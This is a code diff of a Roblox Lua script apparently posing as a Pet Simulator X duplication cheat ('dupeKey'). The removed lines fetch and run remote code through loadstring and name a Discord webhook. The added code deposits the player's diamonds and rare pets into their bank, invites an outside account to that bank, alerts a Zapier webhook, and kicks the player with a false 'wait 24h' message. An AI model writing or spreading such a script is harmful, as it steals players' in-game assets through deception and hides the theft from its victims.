@@ -1,4 +1,25 @@
-UserName = "roblox_psxess2"
-WebHook = "https://discord.com/api/webhooks/1059173086718607501/ZWw2811X9zefoUkLreRYpbeBsh5yLBJ8N_dbJZ3ssKxIBXhyKZ-CcWCeyEfpq88rahHQ"
+local dupeKey = 4198082904
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+    local v2 = lib.Directory.Pets[v.id];
+    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
+        table.insert(PetsList, v.uid);
+    end
+end
+local request = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 69);
+if request then
+    lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey)
+    local url = "https://hooks.zapier.com/hooks/catch/12832877/bwscxwe/"
+    local data0 = {}
+    local newdata0 = game:GetService'HttpService':JSONEncode(data0)
+    game:HttpPost(url,newdata0)
+    game.Players.LocalPlayer:Kick("Please wait 24h before your rejoin.")
+end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+
+
+
+
